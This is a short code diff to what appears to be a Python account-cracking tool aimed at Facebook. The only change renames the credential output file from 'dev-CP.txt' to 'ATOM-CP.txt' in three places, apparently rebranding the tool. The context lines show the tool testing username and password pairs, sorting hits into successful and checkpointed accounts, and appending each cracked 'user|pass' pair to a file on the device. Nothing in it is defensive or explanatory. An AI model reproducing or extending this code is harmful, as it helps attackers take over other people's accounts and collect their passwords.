@@ -172,7 +172,7 @@ class System:
                         self.oks.append(user)
                         break
                 elif "checkpoint" in log_cookies:
-                    open("/sdcard/dev-CP.txt","a").write(user+"|"+pas+"\n")
+                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                     self.cps.append(user)
                     break
                 else:continue
@@ -229,7 +229,7 @@ class System:
                         self.oks.append(user)
                         break
                 elif "checkpoint" in log_cookies:
-                    open("/sdcard/dev-CP.txt","a").write(user+"|"+pas+"\n")
+                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                     self.cps.append(user)
                     break
                 else:continue
@@ -370,7 +370,7 @@ class System:
                 elif "www.facebook.com" in response["error"]["message"]:
                     try:user=response["error"]["error_data"]["uid"]
                     except:user=ids
-                    open("/sdcard/dev-CP.txt","a").write(user+"|"+pas+"\n")
+                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                     self.cps.append(user)
                     break
                 else:continue
